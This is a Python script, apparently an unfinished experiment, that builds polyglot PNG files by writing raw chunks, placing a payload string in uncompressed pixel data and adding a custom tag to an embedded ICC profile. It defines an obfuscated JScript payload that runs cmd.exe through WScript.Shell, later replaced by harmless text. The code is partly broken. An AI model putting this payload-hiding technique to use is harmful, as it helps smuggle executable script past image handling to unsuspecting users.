#from PIL import Image
#TODO split in 2 files
import sys
import png
import zlib
import struct

if len(sys.argv) < 2:
        print("Error: No arguments provided.", file=sys.stderr)
        sys.exit(1)

filename = sys.argv[1]
compression_method = zlib.Z_NO_COMPRESSION
payload = """
<script>
a="WScri"
b="pt.She"
c="ll"
new ActiveXObject(a+b+c).Run("cmd.exe")
</script>
"""

payload = "Hello my name is fred <"
payload = payload.encode('ascii')

def createChunk(chunk_type, chunk_data):
        #https://www.w3.org/TR/png/#5Chunk-layout
        length = len(chunk_data)
        chunk = struct.pack('>I', length)
        chunk += chunk_type
        chunk += chunk_data
        crc = zlib.crc32(chunk_type + chunk_data)
        print(crc)
        chunk += struct.pack('>I', crc)
        return chunk


    
reader = png.Reader(filename=filename)
width, height, pixels, metadata = reader.asRGB()
pixels = list(pixels)
nRow = 0
row = pixels[nRow]
if len(payload) > len(row):
        print("Error: payload does not fit in row", file = sys.stderr)
        sys.exit(1)
row[0:len(payload)] = payload
pixels[nRow] = row

bdata = bytearray()
for row in pixels: 
        bdata.append(0) #every row first byte signal the filtering applied, 0 = none
        bdata.extend(row)
compressed = zlib.compress(bdata, level=compression_method)
idat_type = b"IDAT"
idat_chunk = createChunk(idat_type, compressed)

#https://www.w3.org/TR/PNG-Chunks.html
height = len(pixels)
width = int(len(pixels[0])/3)
bit_depth = 8
color_type = 2 #only color used
compression_method = compression_method # already specified
filter_method = 0
interlace_method = 0
idhr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression_method, filter_method, interlace_method)
idhr_type = b"IHDR"
idhr_chunk = createChunk(idhr_type, idhr_data)


def inject_payload_into_icc(real_icc_path, payload):
        #TODO fix it breaks png somehow 
        with open(real_icc_path, 'rb') as f:
        icc = bytearray(f.read())
        tag_count = struct.unpack('>I', icc[128:132])[0]
        # OLD end value
        tag_table_end = 132 + (tag_count * 12)
        #need to shift all contents after the entry table as we add new entry 
        for i in range(tag_count):
                offset_pos = 132 + (i * 12) + 4  # offset 4 = position offset 
                old_offset = struct.unpack('>I', icc[offset_pos:offset_pos+4])[0]
                new_offset = old_offset + 12
                icc[offset_pos:offset_pos+4] = struct.pack('>I', new_offset)
        # payload after old icc size + new table entry size
        payload_offset = len(icc) + 12
        # create new entry tag
        new_tag = b'poly' + struct.pack('>II', payload_offset, len(payload)) 
        # add new payload and set fields
        icc = icc[:tag_table_end] + new_tag + icc[tag_table_end:] + payload  
        icc[128:132] = struct.pack('>I', tag_count + 1)   
        icc[0:4] = struct.pack('>I', len(icc)) 
        return bytes(icc)

def create_iccp_chunk(profile_name, icc_profile):
        chunk_data = profile_name.encode('latin-1') + b'\x00'
        chunk_data += b'\x00'  # compression method = zlib
        chunk_data += zlib.compress(icc_profile, level=compression_method)
        return createChunk(b'iCCP', chunk_data)

# Create ICC with payload
icc_payload = b'Keep this profiel in tact at all costs!'
icc_profile = inject_payload_into_icc("srgb.icc", icc_payload)
iccp_chunk = create_iccp_chunk("payload_profile", icc_profile)
with open(filename + "poly.png", 'wb') as f:
        f.write(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A')
        f.write(idhr_chunk)
        f.write(iccp_chunk)
        f.write(idat_chunk)
